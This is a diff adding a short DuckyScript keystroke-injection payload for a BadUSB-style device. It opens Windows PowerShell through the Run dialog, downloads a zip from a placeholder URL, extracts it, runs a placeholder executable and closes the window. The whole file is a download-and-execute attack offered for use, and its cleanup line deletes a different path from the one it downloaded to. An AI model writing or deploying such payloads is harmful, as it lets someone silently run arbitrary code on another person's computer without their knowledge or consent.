@@ -1,0 +1,12 @@
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri <ZIP URL> -OutFile "~\Documents\file.zip"; Expand-Archive -Path "~\Documents\file.zip" -DestinationPath "~\Documents\file"; Remove-Item "~\Documents\My Games\file.zip"; & '<EXE PATH>'
+ENTER
+ENTER
+DELAY 10000
+ALT F4
